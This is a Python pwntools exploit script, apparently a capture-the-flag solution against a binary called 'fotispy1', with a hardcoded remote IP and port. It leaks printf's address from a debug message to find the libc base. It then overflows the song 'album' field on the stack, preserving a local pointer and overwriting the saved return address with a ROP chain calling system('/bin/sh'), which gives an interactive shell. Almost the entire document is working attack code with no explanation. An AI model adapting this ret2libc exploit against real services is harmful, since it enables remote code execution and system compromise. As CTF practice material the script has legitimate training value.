#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fotispy1
from pwn import *

# Set up pwntools for the correct architecture
elf = context.binary = ELF(args.EXE or 'fotispy1')
context.terminal = ['wt.exe','wsl.exe']
libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOT:
        return remote('52.59.124.14', 5191)
    else:
        return process([elf.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x3fe000)
# RUNPATH:    b'./'

def m(i): p.sendlineafter(b'[E]: ', str(i).encode())

p = start()

DEST_LEN = 13
OFF_V3   = 13      # [rbp-8]
OFF_RBP  = 21      # saved RBP
OFF_RIP  = 29      # saved RIP

QWORD_4040A0 = 0x4040A0
safe_v3 = p64(QWORD_4040A0 + 8*5)   # points to a zero qword; *v3==0 ends loop cleanly
print(hex(QWORD_4040A0 + 8*5))

# Register and login
m(0); p.sendlineafter(b'username: ', b'u'); p.sendlineafter(b'password: ', b'p')
m(1); p.sendlineafter(b'username: ', b'u'); p.sendlineafter(b'password: ', b'p')

# Add song (album overflows)
m(2)
p.recvuntil(b'[DEBUG] ')
leak = int(p.recvline().strip(), 16)
log.info(f'printf& leak: {hex(leak)}')
libc.address = leak - libc.sym.printf
log.info(f'libc leak: {hex(libc.address)}')

rop = ROP(libc)
rop.raw(rop.ret.address)
rop.system(next(libc.search(b'/bin/sh\00')))

pad_to_v3  = b'A'*OFF_V3
after_v3   = OFF_RBP - OFF_V3 - 8      # bytes between v3 (8 bytes) and saved RBP
after_rbp  = OFF_RIP - OFF_RBP - 8     # bytes between saved RBP (8 bytes) and saved RIP

payload = pad_to_v3
payload += safe_v3                     # overwrite v3 ([rbp-8])
payload += b'B'*after_v3
payload += b'C'*8                      # saved RBP (dummy)
payload += b'D'*after_rbp
# payload += p64(0x000000000040101a)
payload += rop.chain()

p.sendlineafter(b'title: ', b'a')
p.sendlineafter(b'is from: ', b'a')
p.sendlineafter(b'is on: ', payload)

# Trigger the overflow and return
m(3)
p.interactive()

